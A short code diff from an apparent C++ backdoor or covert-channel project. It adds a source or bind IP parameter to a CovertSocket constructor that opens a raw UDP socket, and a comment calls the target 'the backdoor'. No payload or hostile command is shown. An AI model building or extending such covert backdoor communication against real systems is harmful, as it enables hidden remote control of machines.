@@ -15,9 +15,10 @@
 #include "../utils/Logger.h"
 #include "../utils/Structures.h"
 
-CovertSocket::CovertSocket(std::string connectionIPAddress)
+CovertSocket::CovertSocket(std::string connectionIPAddress, std::string srcIP)
 {
     this->connectionIPAddress = connectionIPAddress; //Set the IP address of the backdoor
+    this->srcIP = srcIP; //Set the bind IP address
     this->rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     int arg = 1;
     if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
